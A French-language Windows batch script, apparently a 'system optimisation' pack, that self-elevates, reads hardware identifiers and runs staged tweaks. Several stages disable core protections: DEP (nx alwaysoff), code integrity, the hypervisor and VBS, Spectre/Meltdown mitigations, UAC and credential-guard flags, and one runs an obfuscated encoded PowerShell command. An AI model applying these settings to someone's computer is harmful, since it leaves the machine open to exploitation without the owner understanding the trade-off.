@echo off
@Title HGD
cd /d %~dp0
mode con:cols=70 lines=20
SET indigo=[38;5;105m
SET white=[37m
cls

RMDIR %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
MKDIR %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
	powershell -NoProfile -NonInteractive -Command start -verb runas "'%~s0'" >nul 2>&1 & exit /b
)

SET OPLOCATION=%CD%

IF EXIST "C:\TEST.AD" (
    START "" "%OPLOCATION%"
    Exit
)

SET SCPI=1
SET VM=ERR
SET VLWD=N
SET GPU=ERR
SET HWID=LOAD
SET "PCTYP=Inconnu"
attrib +h +s "C:\Ect"

FOR /f "tokens=*" %%a in ('powershell -Command "(Get-WmiObject Win32_BIOS).BIOSCharacteristics -contains 33"') do set "USBlegacy=%%a"
IF "%USBlegacy%"=="True" (set VM=NO) else (set VM=YES)

FOR /f "tokens=*" %%i in ('powershell -Command "Get-WmiObject win32_videocontroller | Select-Object -ExpandProperty Name"') do set GPU_NAME=%%i
echo %GPU_NAME% | find /I "NVIDIA" > nul
IF %ERRORLEVEL% == 0 (set GPU=NVIDIA&goto :ENDGPU)
echo %GPU_NAME% | find /I "AMD" > nul
IF %ERRORLEVEL% == 0 (set GPU=AMD&goto :ENDGPU)
echo %GPU_NAME% | find /I "VMWARE" > nul
IF %ERRORLEVEL% == 0 (set GPU=VMWARE&goto :ENDGPU)
echo %GPU_NAME% | find /I "INTEL" > nul
IF %ERRORLEVEL% == 0 (set GPU=INTEL&goto :ENDGPU)
set GPU=UNKNOWN
:ENDGPU

FOR /F "delims=" %%A in ('powershell -command "Get-WmiObject -Class Win32_SystemEnclosure | Select-Object -ExpandProperty ChassisTypes"') do (
    set "chassisType=%%A"
)

FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Cryptography" 2^>NUL^|FIND /I "MachineGuid"') DO set MGG=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" 2^>NUL^|FIND /I "CurrentBuildNumber"') DO set RO1=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" 2^>NUL^|FIND /I "DisplayVersion"') DO set RO2=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" 2^>NUL^|FIND /I "EditionID"') DO set RO3=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" 2^>NUL^|FIND /I "EditionSubManufacturer"') DO set RO4=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" 2^>NUL^|FIND /I "EditionSubstring"') DO set RO5=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" 2^>NUL^|FIND /I "ProductName"') DO set RO6=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" 2^>NUL^|FIND /I "RegisteredOrganisation"') DO set RO7=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" 2^>NUL^|FIND /I "RegisteredOrganization"') DO set RO8=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" 2^>NUL^|FIND /I "ReleaseId"') DO set RO9=%%B
FOR /F "TOKENS=2,*" %%A IN ('Reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" 2^>NUL^|FIND /I "ProductId"') DO set RO0=%%B

IF %chassisType%==1 SET "PCTYP=Inconnu"
IF %chassisType%==2 SET "PCTYP=Inconnu"
IF %chassisType%==3 SET "PCTYP=Desktop" & SET SCPI=2
IF %chassisType%==8 SET "PCTYP=Portable"
IF %chassisType%==9 SET "PCTYP=Laptop"
IF %chassisType%==10 SET "PCTYP=Notebook"
IF %chassisType%==14 SET "PCTYP=Sub-Notebook"
IF %chassisType%==30 SET "PCTYP=Tablet"
IF %chassisType%==31 SET "PCTYP=Convertible"
IF %chassisType%==32 SET "PCTYP=Detachable"

:DQSADM
@timeout /t 05>nul
IF EXIST PID.log (
	for /f "usebackq tokens=*" %%a in ("PID.log") do (
    	SET "PID=%%a"
    	goto :PIDF
	)
) else (
	echo NO - PID.log
	Ping 10>nul
	goto :DQSADM
)

:PIDF
IF %PID%==Erreur goto :FATALERROR
IF %PID%==Error goto :FATALERROR
SET "TargetPID=%PID%"
SET IDS=1

timeout /t 05 /nobreak>nul
SET NETFX3PATH=%cd%

:PIDFV
for /f "tokens=*" %%i in ('powershell "Get-WmiObject Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber"') do SET "HWID=%%i"
for /f "tokens=*" %%a in ('powershell -Command "(Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize"') do SET "mem=%%a"
SET /a ram=%mem% + 1024000
@Title HGD-AD

SET AHWID=%HWID%
SET AMGG=%MGG%

IF %HWID%==219925897859274 (
	SET AHWID=Privée
	SET AMGG=Privée
)
IF %HWID%==191262638503131 (
	SET AHWID=Privée
	SET AMGG=Privée
)
IF %HWID%==J216401760 (
	SET AHWID=Privée
	SET AMGG=Privée
)
IF %HWID%==PF0TRR6A (
	SET AHWID=Privée
	SET AMGG=Privée
)

mode con:cols=70 lines=19
cd /d %~dp0
cls
echo I--------------------------------------------------------------------I
echo  %indigo%DEBUG:%white%
echo  [Username               ] = %username%
echo  [PC Name                ] = %computername%
echo  [Baseboard ID           ] = %AHWID%
echo  [ID                     ] = %PID%
echo  [MachineGuid            ] = %AMGG%
echo  [ProductName            ] = %RO6%
echo  [RegisteredOrganisation ] = %RO7%
echo  [EditionID              ] = %RO3%
echo  [DisplayVersion         ] = %RO2%
echo  [CurrentBuildNumber     ] = %RO1%
echo  [ReleaseId              ] = %RO9%
echo  [ChassisType            ] = %PCTYP%
echo  [VM                     ] = %VM%
echo  [GPU                    ] = %GPU%
echo  [RAM / MEM              ] = %ram% / %mem%
echo I--------------------------------------------------------------------I

IF EXIST SVPP1.STR (
	START /WAIT "" "obyss_data\ph_visual\UEPrereqSetup_x64.exe" /silent
	@timeout /t 02 /nobreak>nul
	echo Y>SVPP1.END
	DEL SVPP1.STR
	cd /d %~dp0
)

IF EXIST SVPP2.STR (
	START /WAIT "" "obyss_data\ph_visual\VisualCppRedist_AIO_x86_x64.exe" /ai
	timeout /t 02 /nobreak>nul
	echo Y>SVPP2.END
	DEL SVPP2.STR
	cd /d %~dp0
)

IF EXIST SVPP3.STR (
	START /WAIT "" "obyss_data\ph_visual\VC_redist.x64.exe" -s
	START /WAIT "" "obyss_data\ph_visual\VC_redist.x64.exe" /q /norestart
	timeout /t 02 /nobreak>nul
	echo Y>SVPP3.END
	DEL SVPP3.STR
)

IF EXIST SVPP4.STR (
	START /WAIT "" "obyss_data\ph_visual\dxwebsetup.exe" -Q
	timeout /t 02 /nobreak>nul
	echo Y>SVPP4.END
	DEL SVPP4.STR
)

IF EXIST SVPP5.STR (
	IF %VM%==NO START /min /wait obyss_data\ph_gpu\GPU.bat
	cd /d %~dp0
	timeout /t 05 /nobreak>nul
	DEL obyss_data\ph_gpu\AMD.bat >NUL
	DEL obyss_data\ph_gpu\AMD.reg >NUL
	DEL obyss_data\ph_gpu\CG.reg >NUL
	DEL obyss_data\ph_gpu\GPU.bat >NUL
	DEL obyss_data\ph_gpu\Intel.bat >NUL
	DEL obyss_data\ph_gpu\NVIDIA.bat >NUL
	DEL obyss_data\ph_gpu\NVIDIA.reg >NUL
	DEL obyss_data\ph_visual\dxwebsetup.exe >NUL
	DEL obyss_data\ph_visual\UEPrereqSetup_x64.exe >NUL
	DEL obyss_data\ph_visual\VC_redist.x64.exe >NUL
	echo Y>SVPP5.END
	DEL SVPP5.STR
)

IF EXIST SVPP6.STR (
	powercfg -restoredefaultschemes
 	timeout /t 05>nul
	powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 3ff9831b-6f80-4830-8178-736cd4229e7b
	powercfg -changename 3ff9831b-6f80-4830-8178-736cd4229e7b "Revision"
	powercfg -s 3ff9831b-6f80-4830-8178-736cd4229e7b
	powercfg -setacvalueindex scheme_current sub_processor PERFINCPOL 2
	powercfg -setacvalueindex scheme_current sub_processor PERFDECPOL 1
	powercfg -setacvalueindex scheme_current sub_processor PERFINCTHRESHOLD 10
	powercfg -setacvalueindex scheme_current sub_processor PERFDECTHRESHOLD 8
	powercfg -setacvalueindex scheme_current sub_processor CPMINCORES 100
	powercfg -setacvalueindex scheme_current sub_processor CPMINCORES1 100
	powercfg /setactive scheme_current
	timeout /t 10>nul
	Powercfg /IMPORT %systemdrive%\Ect\Alimentation\RECS-H-PowerPlan.pow 11111111-2222-3333-4444-111111111111
	timeout /t 05 /nobreak >NUL
	Powercfg /SETACTIVE "11111111-2222-3333-4444-111111111111"
	timeout /t 05 /nobreak >NUL
	PowerRun_x64.exe /SW:0 cmd.exe /k "PowerShell -Command "Disable-MMAgent -MemoryCompression"&Exit"
	timeout /t 02 /nobreak >NUL
	PowerRun_x64.exe /SW:0 cmd.exe /k "PowerShell -Command "Disable-MMAgent -PageCombining"&Exit"
	timeout /t 01 /nobreak >NUL
	cd /d %~dp0
	echo Y>SVPP6.END
	DEL SVPP6.STR
)

IF EXIST SVPP7.STR (
	Powercfg /hibernate off
	netsh interface Teredo set state servername=default
	netsh interface Teredo set state type=default
	powercfg -setacvalueindex scheme_current sub_processor PERFINCPOL 2
	powercfg -setacvalueindex scheme_current sub_processor PERFDECPOL 1
	powercfg -setacvalueindex scheme_current sub_processor PERFINCTHRESHOLD 10
	powercfg -setacvalueindex scheme_current sub_processor PERFDECTHRESHOLD 8
	powercfg -setacvalueindex scheme_current sub_processor PROCTHROTTLEMIN 0
	bcdedit /set useplatformtick false
	bcdedit /set useplatformclock false
	bcdedit /set disabledynamictick yes
	bcdedit /set vsmlaunchtype Off
	bcdedit /set bootmenupolicy Legacy
	bcdedit /set lastknowngood yes
	bcdedit /set vm No
	bcdedit /set {globalsettings} custom:16000067 false
	bcdedit /set {globalsettings} custom:16000068 true
	bcdedit /set {globalsettings} custom:16000069 false
	bcdedit /set quietboot No
	bcdedit /set bootux Disabled
	bcdedit /set bootlog no
	bcdedit /timeout 3
	bcdedit /event off
	bcdedit /bootdebug off
	bcdedit /set debug No
	bcdedit /set ems No
	bcdedit /set bootems No
	bcdedit /set tpmbootentropy ForceDisable
	bcdedit /set nx alwaysoff
	bcdedit /set integrityservices disable
	bcdedit /set allowedinmemorysettings 0
	bcdedit /set perfmem 0
	bcdedit /deletevalue usefirmwarepcisettings
	bcdedit /set hypervisorlaunchtype off
	bcdedit /set isolatedcontext No
	fsutil behavior set disablecompression 1
	fsutil behavior set disable8dot3 1
	fsutil behavior set encryptpagingfile 0
	fsutil behavior set DisableDeleteNotify 1
	fsutil behavior set disableLastAccess 1
	fsutil behavior set mftzone 2
	fsutil behavior set memoryusage 2
	fsutil behavior set disablelastaccess 1
	wevtutil sl Microsoft-Windows-SleepStudy/Diagnostic /e:false
	wevtutil sl Microsoft-Windows-Kernel-Processor-Power/Diagnostic /e:false
	wevtutil sl Microsoft-Windows-UserModePowerService/Diagnostic /e:false
	powercfg -setacvalueindex scheme_current sub_processor PROCTHROTTLEMIN 0
	powercfg /setactive scheme_current
	echo Y>SVPP7.END
	DEL SVPP7.STR
)

IF EXIST SVPP8.STR (
	PowerRun_x64.exe "obyss_data\ph_scp\scp4.bat">nul
	timeout /t 02 /nobreak>nul
	cd /d %~dp0
	START /min /wait obyss_data\ph_scp\scp4.bat
	timeout /t 05 /nobreak>nul
	powershell.exe -encodedCommand JABkAGUAdgBpAGMAZQBzAFUAUwBCACAAPQAgAEcAZQB0AC0AUABuAHAARABlAHYAaQBjAGUAIAB8ACAAdwBoAGUAcgBlACAAewAkAF8ALgBJAG4AcwB0AGEAbgBjAGUASQBkACAALQBsAGkAawBlACAAIgAqAFUAUwBCAFwAUgBPAE8AVAAqACIAfQAgACAAfAAgAA0ACgBGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAAtAFAAcgBvAGMAZQBzAHMAIAB7AA0ACgBHAGUAdAAtAEMAaQBtAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzAE4AYQBtAGUAIABNAFMAUABvAHcAZQByAF8ARABlAHYAaQBjAGUARQBuAGEAYgBsAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdABcAHcAbQBpACAADQAKAH0ADQAKAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAgACQAZABlAHYAaQBjAGUAIABpAG4AIAAkAGQAZQB2AGkAYwBlAHMAVQBTAEIAIAApAA0ACgB7AA0ACgAgACAAIAAgAFMAZQB0AC0AQwBpAG0ASQBuAHMAdABhAG4AYwBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAHIAbwBvAHQAXAB3AG0AaQAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgACoAIABGAFIATwBNACAATQBTAFAAbwB3AGUAcgBfAEQAZQB2AGkAYwBlAEUAbgBhAGIAbABlACAAVwBIAEUAUgBFACAASQBuAHMAdABhAG4AYwBlAE4AYQBtAGUAIABMAEkASwBFACAAJwAlACQAKAAkAGQAZQB2AGkAYwBlAC4AUABOAFAARABlAHYAaQBjAGUASQBEACkAJQAnACIAIAAtAFAAcgBvAHAAZQByAHQAeQAgAEAAewBFAG4AYQBiAGwAZQA9ACQARgBhAGwAcwBlAH0AIAAtAFAAYQBzAHMAVABoAHIAdQANAAoAfQANAAoADQAKACQAYQBkAGEAcAB0AGUAcgBzACAAPQAgAEcAZQB0AC0ATgBlAHQAQQBkAGEAcAB0AGUAcgAgAC0AUABoAHkAcwBpAGMAYQBsACAAfAAgAEcAZQB0AC0ATgBlAHQAQQBkAGEAcAB0AGUAcgBQAG8AdwBlAHIATQBhAG4AYQBnAGUAbQBlAG4AdAANAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAGEAZABhAHAAdABlAHIAIABpAG4AIAAkAGEAZABhAHAAdABlAHIAcwApAA0ACgAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAYQBkAGEAcAB0AGUAcgAuAEEAbABsAG8AdwBDAG8AbQBwAHUAdABlAHIAVABvAFQAdQByAG4ATwBmAGYARABlAHYAaQBjAGUAIAA9ACAAJwBEAGkAcwBhAGIAbABlAGQAJwANAAoAIAAgACAAIAAgACAAIAAgACQAYQBkAGEAcAB0AGUAcgAgAHwAIABTAGUAdAAtAE4AZQB0AEEAZABhAHAAdABlAHIAUABvAHcAZQByAE0AYQBuAGEAZwBlAG0AZQBuAHQADQAKACAAIAAgACAAIAAgACAAIAB9AA==
	DEL obyss_data\ph_scp\scp4.bat>nul
	echo Y>SVPP8.END
	DEL SVPP8.STR
)

IF EXIST SVPP9.STR (
	Call :ALTSYS
	cd /d %~dp0
	@timeout /t 01>nul
	echo Y>SVPP9.END
	DEL SVPP9.STR
)

IF EXIST SVPP10.STR (
	for /f "tokens=*" %%a in ('powershell -Command "(Get-WmiObject Win32_Processor).L2CacheSize"') do set "l2cache=%%a"
	for /f "tokens=*" %%a in ('powershell -Command "(Get-WmiObject Win32_Processor).L3CacheSize"') do set "l3cache=%%a"
	@timeout /t 01 >nul
	Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "SecondLevelDataCache" /t REG_DWORD /d "%l2cache%" /f
	Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "ThridLevelDataCache" /t REG_DWORD /d "%l3cache%" /f
	setx DOTNET_CLI_TELEMETRY_OPTOUT 1
	setx POWERSHELL_TELEMETRY_OPTOUT 1
	setx POWERSHELL_CLI_TELEMETRY_OPTOUT 1
	setx DOTNET_TELEMETRY_OPTOUT 1
	cd /d %~dp0
	@timeout /t 01>nul
	DEL obyss_data\ph_scp\scp3.bat>nul
	echo Y>SVPP10.END
	DEL SVPP10.STR
)

IF EXIST SVPP11.STR (
	START /min obyss_data\ph_privacy\privacy.bat
	PowerRun_x64.exe "obyss_data\ph_scp\scp8.bat">nul
	timeout /t 02 /nobreak>nul
	cd /d %~dp0
	START /min /wait obyss_data\ph_scp\scp8.bat
	cd /d %~dp0
	@timeout /t 01>nul
	DEL obyss_data\ph_scp\scp8.bat>nul
	echo Y>SVPP11.END
	DEL SVPP11.STR
)

IF EXIST SVPP12.STR (
	PowerRun_x64.exe "obyss_data\ph_scp\scp5.bat">nul
	timeout /t 02 /nobreak>nul
	cd /d %~dp0
	START /min /wait obyss_data\ph_scp\scp5.bat
	cd /d %~dp0
	@timeout /t 01>nul
	PowerRun_x64.exe "obyss_data\ph_scp\scp9.bat">nul
	timeout /t 02 /nobreak>nul
	cd /d %~dp0
	START /min /wait obyss_data\ph_scp\scp9.bat
	cd /d %~dp0
	DEL obyss_data\ph_scp\scp5.bat>nul
	DEL obyss_data\ph_scp\scp9.bat>nul
	echo Y>SVPP12.END
	DEL SVPP12.STR
)

IF EXIST SVPP13.STR (
	Call :PAGEFILE
	cd /d %~dp0
	@timeout /t 01>nul
	echo Y>SVPP13.END
	DEL SVPP13.STR
)

IF EXIST SVPP14.STR (
	powershell -command "Get-AppxPackage *WebExperience* | Remove-AppxPackage"
	powershell -command "Get-AppxPackage -AllUsers Microsoft.XboxGamingOverlay | Remove-AppxPackage"
	START /min /wait obyss_data\ph_powershell\Powstart.exe
	cd /d %~dp0
	@timeout /t 01>nul
	DEL obyss_data\ph_powershell\Optimisation.preset>nul
	DEL obyss_data\ph_powershell\Powstart.exe>nul
	DEL obyss_data\ph_powershell\Win10.ps1>nul
	DEL obyss_data\ph_powershell\Win10.psm1>nul
	cd /d %~dp0
	@timeout /t 01>nul
	echo Y>SVPP14.END
	DEL SVPP14.STR
)

IF EXIST SVPP15.STR (
	for /f "tokens=*" %%a in ('powershell -Command "(Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize"') do set "mem=%%a"
	set /a ram=%mem% + 1024000
	@timeout /t 01>nul
	Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "%ram%" /f>nul
	Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SPP\Clients" /f>nul
	echo Y>SVPP15.END
	DEL SVPP15.STR
)

IF EXIST SVPP16.STR (
	cd /d %~dp0
	Call :BATCHSCRIPT_1
	timeout /t 02 /nobreak>nul
	cd /d %~dp0
	echo Y>SVPP16.END
	DEL SVPP16.STR
)

IF EXIST SVPP17.STR (
	Call :BATCHSCRIPT_2
	timeout /t 03 /nobreak>nul
	cd /d %~dp0
	PowerRun_x64.exe "obyss_data\ph_batchfiles\NTLITE.bat">nul
	timeout /t 03 /nobreak>nul
	cd /d %~dp0
	START /min /wait obyss_data\ph_batchfiles\NTLITE.bat
	timeout /t 02 /nobreak>nul
	cd /d %~dp0
	DEL obyss_data\ph_batchfiles\NTLITE.bat>nul
	echo Y>SVPP17.END
	DEL SVPP17.STR
)

IF EXIST SVPP18.STR (
	Call :BATCHSCRIPT_3
	PowerRun_x64.exe "obyss_data\ph_regfiles\regfilesimport.bat">nul
	timeout /t 02 /nobreak>nul
	cd /d %~dp0
	START /min /wait obyss_data\ph_regfiles\regfilesimport.bat
	cd /d %~dp0
	@timeout /t 01>nul
	DEL obyss_data\ph_regfiles\regfilesimport.bat>nul
	DEL obyss_data\ph_regfiles\CG.reg>nul
	DEL obyss_data\ph_regfiles\CursorBlinkRate.reg>nul
	DEL obyss_data\ph_regfiles\DisableClearPageFileAtShutdownOff.reg>nul
	DEL obyss_data\ph_regfiles\disable-driver-updates.reg>nul
	DEL obyss_data\ph_regfiles\DisableEnablePrefetcher.reg>nul
	DEL obyss_data\ph_regfiles\DisableFirefoxUpdates.reg>nul
	DEL obyss_data\ph_regfiles\DisableHibernateEnabled.reg>nul
	DEL obyss_data\ph_regfiles\DisableNetworkUsage.reg>nul
	DEL obyss_data\ph_regfiles\DisablePowerThrottling.reg>nul
	DEL obyss_data\ph_regfiles\DisableSpectreMeltdown.reg>nul
	DEL obyss_data\ph_regfiles\DisableSuperfetch.reg>nul
	DEL obyss_data\ph_regfiles\Fully_Disable_Notifications.reg>nul
	DEL obyss_data\ph_regfiles\Fully_Disable_UAC.reg>nul
	DEL obyss_data\ph_regfiles\GDT.reg>nul
	DEL obyss_data\ph_regfiles\MaintenanceDisabled.reg>nul
	DEL obyss_data\ph_regfiles\mdreg_1.reg>nul
	DEL obyss_data\ph_regfiles\MenuShowDelay.reg>nul
	DEL obyss_data\ph_regfiles\MouseFix.reg>nul
	DEL obyss_data\ph_regfiles\MouseHoverTime.reg>nul
	DEL obyss_data\ph_regfiles\REG.reg>nul
	DEL obyss_data\ph_regfiles\SetCTCP.reg>nul
	DEL obyss_data\ph_regfiles\snap.reg>nul
	DEL obyss_data\ph_regfiles\spectremeltdown.reg>nul
	echo Y>SVPP18.END
	DEL SVPP18.STR
)

IF EXIST SVPP19.STR (
	Call :BATCHSCRIPT_4
	timeout /t 05 /nobreak>nul
	cd /d %~dp0
	echo Y>SVPP19.END
	DEL SVPP19.STR
)

IF EXIST SVPP20.STR (
	cd /d %~dp0
	PowerRun_x64.exe "obyss_data\ph_batchfiles\D-Autologgers.bat">nul
	PowerRun_x64.exe "obyss_data\ph_batchfiles\DELREG.bat">nul
	timeout /t 03 /nobreak>nul
	cd /d %~dp0
	START /min /wait obyss_data\ph_batchfiles\D-Autologgers.bat
	timeout /t 01 /nobreak>nul
	cd /d %~dp0
	START /min /wait obyss_data\ph_batchfiles\DELREG.bat
	timeout /t 01 /nobreak>nul
	cd /d %~dp0
	DEL obyss_data\ph_batchfiles\D-Autologgers.bat>nul
	DEL obyss_data\ph_batchfiles\DELREG.bat>nul
	cd /d %~dp0
	echo Y>SVPP20.END
	DEL SVPP20.STR
)

IF EXIST SVPP21.STR (
	IF NOT %HWID%==191262638503131 Start "" "C:\Ect\STR\SetTimerResolutionService.exe" -Install
	Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "GlobalTimerResolutionRequests" /t REG_DWORD /d "1" /f > nul
	timeout /t 02 /nobreak>nul
	IF NOT %HWID%==191262638503131 SC START STR
	echo Y>SVPP21.END
	DEL SVPP21.STR
)

IF EXIST SVPP22.STR (
	START /min /wait obyss_data\ph_drivers\Devices.bat
	IF %SCPI%==1 (START /min /wait obyss_data\ph_drivers\port.bat) else (START /min /wait obyss_data\ph_drivers\desk.bat)
	cd /d %~dp0
	@timeout /t 01>nul
	DEL obyss_data\ph_drivers\Devices.bat>nul
	DEL obyss_data\ph_drivers\desk.bat>nul
	DEL obyss_data\ph_drivers\port.bat>nul
	DEL obyss_data\ph_drivers\DevManView.exe>nul
	echo Y>SVPP22.END
	DEL SVPP22.STR
)

IF EXIST SVPP23.STR (
	PowerRun_x64.exe "obyss_data\ph_batchfiles\Schedule.bat">nul
	timeout /t 02 /nobreak>nul
	START /min /wait obyss_data\ph_batchfiles\Schedule.bat
	cd /d %~dp0
	@timeout /t 01>nul
	DEL obyss_data\ph_batchfiles\Schedule.bat>nul
	echo Y>SVPP23.END
	DEL SVPP23.STR
)

IF EXIST SVPP24.STR (
	START /min /wait obyss_data\ph_privacy\bloatware.bat
	@timeout /t 01>nul
	DEL obyss_data\ph_privacy\bloatware.bat>nul
	echo Y>SVPP24.END
	DEL SVPP24.STR
)

IF EXIST SVPP25.STR (
	Call :CONFINTL
	@timeout /t 01>nul
	DEL obyss_data\ph_privacy\clear.bat>nul
	echo Y>SVPP25.END
	DEL SVPP25.STR
)

IF EXIST SVPP26.STR (
	cd /d %~dp0
	powershell -ExecutionPolicy Bypass -File "obyss_data\ph_batchfiles\kern.ps1"
	powershell -ExecutionPolicy Bypass -File "obyss_data\ph_batchfiles\SLOWPOWERSHEL.ps1"
	echo Y>SVPP26.END
	DEL SVPP26.STR
)

IF EXIST SVPP27.STR (
	cd /d %~dp0
	IF NOT EXIST "C:\Program Files\VideoLAN\VLC\vlc.exe" Start /wait "" "obyss_data\ph_soft\vlc-3.0.21-win64.exe" /S
	echo Y>SVPP27.END
	DEL SVPP27.STR
)

IF EXIST SVPP28.STR (
	cd /d %~dp0
	IF NOT EXIST "C:\Program Files\7-Zip\7zFM.exe" Start /wait "" "obyss_data\ph_soft\7z2409-x64.exe" /S
	echo Y>SVPP28.END
	DEL SVPP28.STR
)

IF EXIST SVPP29.STR (
	cd /d %~dp0
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarGlomLevel" /t REG_DWORD /d "0" /f >nul
	IF EXIST "obyss_data\ph_soft\StartBack.reg" Reg.exe import obyss_data\ph_soft\StartBack.reg >nul 2>&1
	@timeout /t 02>nul
	IF EXIST "obyss_data\ph_soft\StartBack_AiO.exe" Start /wait "" "obyss_data\ph_soft\StartBack_AiO.exe" /SILENT
	@timeout /t 02>nul
	IF EXIST "obyss_data\ph_soft\StartBack.reg" Reg.exe import obyss_data\ph_soft\StartBack.reg >nul 2>&1
	echo Y>SVPP29.END
	DEL SVPP29.STR
)

IF EXIST SVPP30.STR (
	PowerShell -NonInteractive -NoLogo -NoP -C "& {$tmp = (New-TemporaryFile).FullName; CertUtil -generateSSTFromWU -f $tmp; if ( (Get-Item $tmp | Measure-Object -Property Length -Sum).sum -gt 0 ) { $SST_File = Get-ChildItem -Path $tmp; $SST_File | Import-Certificate -CertStoreLocation "Cert:\LocalMachine\Root"; $SST_File | Import-Certificate -CertStoreLocation "Cert:\LocalMachine\AuthRoot" } Remove-Item -Path $tmp}"
	@timeout /t 02>nul
	START /min /wait obyss_data\ph_hosts\up_hosts.bat
	@timeout /t 05>nul
	DEL obyss_data\ph_hosts\up_hosts.bat>nul
	DEL obyss_data\ph_hosts\mvps.exe>nul
	echo Y>SVPP30.END
	DEL SVPP30.STR
)

IF EXIST SVPP31.STR (
	PowerRun_x64.exe "obyss_data\ph_services\DSER.bat">nul
	timeout /t 02 /nobreak>nul
	START /min /wait obyss_data\ph_services\DSER.bat
	@timeout /t 05>nul
	DEL obyss_data\ph_services\DSER.bat>nul
	DEL obyss_data\ph_services\DSERBIN\REGSER.reg>nul
	DEL obyss_data\ph_services\DSERBIN\ServG.bat>nul
	DEL obyss_data\ph_services\DSERBIN\ServG_Lite.bat>nul
	echo Y>SVPP31.END
	DEL SVPP31.STR
)

IF EXIST SVPP32.STR (
	cd /d %~dp0
	START /min /wait obyss_data\ph_wpd\FINAL.bat
	@timeout /t 10 >nul
	cd /d %~dp0
	DEL obyss_data\ph_wpd\FINAL.bat>nul
	DEL obyss_data\ph_wpd\OOSU10.exe>nul
	DEL obyss_data\ph_wpd\recs.cfg>nul
	echo Y>SVPP32.END
	DEL SVPP32.STR
)

IF EXIST SVPP33.STR (
	Reg.exe add "HKCR\CLSID\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /v "System.IsPinnedToNameSpaceTree" /t REG_DWORD /d "0" /f
	Reg.exe add "HKCR\WOW6432Node\CLSID\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /v "System.IsPinnedToNameSpaceTree" /t REG_DWORD /d "0" /f
	echo Y>SVPP33.END
	DEL SVPP33.STR
	goto :ENDSCR
)

tasklist /FI "PID eq %TargetPID%" | findstr "cmd.exe" >nul

if %errorlevel% equ 0 (
	Ping 02>nul
	goto :PIDFV
)

:FATALERROR
cls
echo.
echo  %red%ERREUR :
echo  IMPOSSIBLE DE TROUVER LE PID%white%
echo.
echo  PID = %PID%
echo.
echo Appuyez sur une touche pour terminer le script.
pause>nul
Exit

:ALTSYS
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\GRE_Initialize" /v "DisableRemoteFontBootCache" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\GRE_Initialize" /v "DisableRemoteFontBootCache" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\MUI\StringCacheSettings" /v "StringCacheGeneration" /t REG_DWORD /d "0" /f >nul
@timeout /t 02 /nobreak >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "disabledomaincreds" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "restrictanonymous" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d "0" /f >nul
@timeout /t 02 /nobreak >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing" /v "EnableLog" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing" /v "EnableDpxLog" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Component Based Servicing" /v "EnableLog" /t REG_DWORD /d "0" /f >nul
